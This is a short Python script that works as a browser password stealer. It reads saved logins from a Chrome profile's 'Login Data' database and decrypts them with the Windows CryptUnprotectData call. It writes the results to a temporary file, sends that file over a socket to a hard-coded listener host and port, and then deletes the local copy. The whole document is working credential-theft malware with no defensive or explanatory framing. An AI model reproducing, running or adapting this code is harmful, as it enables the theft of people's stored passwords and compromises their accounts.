'''
Created on 19 Jun 2015

@author: Jordan Wright <jordan-wright.github.io>    +    Robyn Hode
https://docs.python.org/3/library/socket.html#socket.socket.shutdown
'''
from os import getenv
from os import remove
import sqlite3
import win32crypt
import socket

host = '192.168.0.104'
port = 1991

default_user = r'\..\Local\Google\Chrome\User Data\Default\Login Data'
profile1_user = r'\..\Local\Google\Chrome\User Data\Profile 1\Login Data'
profile2_user = r'\..\Local\Google\Chrome\User Data\Profile 2\Login Data'

passfilename = "passwordsdecrypt.db"

# Open and decrypt login data
try:
    conn = sqlite3.connect(getenv("APPDATA") + profile1_user)
    conn2 = sqlite3.connect(passfilename)

    cursor = conn.cursor()
    cursor2 = conn2.cursor()

    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    cursor2.execute('''CREATE TABLE passwords(url, username, password)''')

    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(
            result[2], None, None, None, 0)[1]
        url = result[0]
        username = result[1]
        if password:
            cursor2.execute(
                "INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (url, username, password))
            conn2.commit()

except Exception as e:
    print(e)
finally:
    conn.close()
    conn2.close()

# Connect LHOST and send login_data
try:
    clientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsock.connect((host, port))
    binary_data = None
    with open(passfilename, 'rb') as passfile:
        binary_data = passfile.read()
    if binary_data:
        clientsock.sendall(binary_data)

    # # Test local
    # if binary_data:
    #     with open("abc.db", 'wb') as abc:
    #         abc.write(binary_data)

except Exception as e:
    print(e)
finally:
    # shutdown connection
    if clientsock:
        try:
            # Must sleep for 1 seconds => shutdown too fast will make data not
            # readable
            import time
            time.sleep(10)
            clientsock.shutdown(socket.SHUT_WR)
            clientsock.close()
        except Exception as e:
            print(e)
    # Remove db
    try:
        remove(passfilename)
    except Exception as e:
        print(e)